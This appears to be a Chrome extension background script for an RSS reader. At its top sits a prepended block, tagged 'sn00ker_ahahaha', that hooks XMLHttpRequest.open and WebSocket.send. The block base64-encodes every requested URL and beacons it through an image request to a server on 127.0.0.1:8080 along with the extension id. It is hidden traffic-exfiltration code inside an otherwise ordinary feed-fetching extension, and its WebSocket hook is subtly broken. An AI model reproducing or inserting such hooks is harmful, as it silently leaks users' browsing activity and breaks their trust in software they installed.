function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/**
* @Author: Mohammad M. AlBanna
* Website: www.MBanna.info
* Facebook: www.FB.com/MBanna.info
*/

refreshFeeds();
setInterval(function(){
    refreshFeeds();
}, 7200000);
function refreshFeeds(){
    var clearStorage = false;
    var counter = 0;
    var feedCounter = 1;
	chrome.storage.sync.get(null,function(result){
        $.each(result, function(savedWebsite, feeds) {
            if(savedWebsite.indexOf("fav_") != -1 || savedWebsite.indexOf("setting_") != -1){
                return;
            }
            var data = JSON.parse(feeds);
            if(typeof data.feedUrl != "undefined" && data.followed == "Y"){
                $.get("https://ajax.googleapis.com/ajax/services/feed/load?num=50&v=1.0&q="+data.feedUrl,function(responseFeeds){
                    if(responseFeeds.responseData != null){
                        if(counter == 0){
                           clearStorage = true; 
                       }else if(counter == 1){
                           clearStorage = false;
                       }
                        
                        if(clearStorage){
                            chrome.storage.local.clear();
                        }
                        var entries = responseFeeds.responseData.feed.entries;
                        $.each(entries,function(index2,entry){
	                            var entryTitle = entry.title;
	                            var entryLink = entry.link;
	                            var entryDescription = entry.contentSnippet;
	                            var websiteTitle = data.websiteTitle;
	                            var direction = data.direction;

	                            var entryImage = "../images/no-image.png";
                                if(typeof entry.mediaGroups != "undefined"){
                                    entryImage = entry.mediaGroups[0].contents[0].url;
                                }else{
                                    var entryImageRegx = /<img[^>]+src="((http|https):\/\/[^">]+?(\.jpg|\.png))"/g;
                                    var imageRegxTest = entryImageRegx.exec(entry.content);
                                    entryImage = imageRegxTest !== null ? imageRegxTest[1] : "../images/no-image.png";
                                }

                                var favorite = "";
	                            chrome.storage.sync.get("fav_"+entryLink,function(entry){
	                            	favorite = $.isEmptyObject(entry) ? "N" : "Y";
	                            	var obj = {};
		                            var key = entryLink;
		                            obj[key] += entryLink;
		                            var json = {"entryCounter":feedCounter,"entryTitle": entryTitle, "entryLink": entryLink,"direction":direction, "entryDescription": entryDescription,"entryImage":entryImage,"websiteTitle":websiteTitle,"favorite":favorite};
		                            obj[key] = JSON.stringify(json);
		                            chrome.storage.local.set(obj);
                                    ++feedCounter;
	                            });

                            });
                    }//If there is feeds respons == url is right.
                    ++counter;
                },"jsonp");
            }//end if to get followed feeds urls
        });//end each
    });
}
function addRssUrl(feedUrl,rssDirection){
    $.get("https://ajax.googleapis.com/ajax/services/feed/load?num=1&v=1.0&q="+feedUrl,function(data){
        if(data.responseData != null){
            var websiteLink = document.createElement("a");
            if(data.responseData.feed.link){
                websiteLink.href = data.responseData.feed.link; 
            }else{
                websiteLink.href = "chrome://"+Math.floor((Math.random() * 100000000) + 1)+".html";    
            }
            var websiteTitle = data.responseData.feed.title;
            var description = data.responseData.feed.description;
            var direction = rssDirection;
            var followed = "Y";
            var pin = "Y";
            var obj = {};
            var keyFeedUrl = feedUrl.replace(/(http:\/\/)|(www\.)/ig,"");
            var key = keyFeedUrl;
            obj[key] += keyFeedUrl;
            var json = {"feedUrl": feedUrl, "websiteUrl": websiteLink.href, "websiteTitle": websiteTitle,"description":description,"direction":direction,"followed":followed,"pin":pin};
            obj[key] = JSON.stringify(json);
            chrome.storage.sync.set(obj);
        }//if there are feeds
    },"jsonp");
}
chrome.runtime.onInstalled.addListener(function(details){
    if(details.reason == "install"){
    	addRssUrl("http://feeds.feedburner.com/outofpalbox","rtl");
    	addRssUrl("http://feeds.feedburner.com/MohammadAlbanna","ltr");
    	addRssUrl("http://www.3arrafni.com/feed","rtl");
    	addRssUrl("http://feeds.feedburner.com/3techarena","rtl");
    	addRssUrl("http://newsrss.bbc.co.uk/rss/newsonline_uk_edition/world/rss.xml","ltr");
    	addRssUrl("http://feeds.gawker.com/lifehacker/full","ltr");
        addRssUrl("http://feeds.feedburner.com/aitnewscom","rtl");
        addRssUrl("http://feeds.feedburner.com/tech-wd","rtl");
        addRssUrl("http://www.idownloadblog.com/feed/","ltr");
        window.open("http://www.mbanna.info/rss-timeliner-chrome-extension/#lastVersion",'_blank');
        setTimeout(function(){
            refreshFeeds();
        },2000);
    }
});
function escapeHTML(s) { 
    return s.replace(/&/g, '&amp;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
}

